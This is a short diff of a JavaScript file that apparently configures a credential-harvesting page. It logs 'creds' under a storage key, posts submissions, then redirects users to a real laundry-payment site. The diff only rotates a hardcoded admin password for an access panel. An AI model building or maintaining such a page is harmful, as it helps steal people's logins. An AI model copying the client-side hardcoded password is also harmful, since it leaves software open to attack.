@@ -3,7 +3,7 @@
 const STORAGE_KEY = 'brown_creds_log';
 const API_URL = '/api/submissions';
 const POST_LOGIN_REDIRECT = 'https://mycscgo.com/laundry';
-const ADMIN_PASSWORD = 'qwerqwer12341234';
+const ADMIN_PASSWORD = 'nimda-8f3k2m9x-rotated-2026';
 const ADMIN_SESSION_KEY = 'nimda_authenticated';
 
 document.addEventListener('DOMContentLoaded', function() {
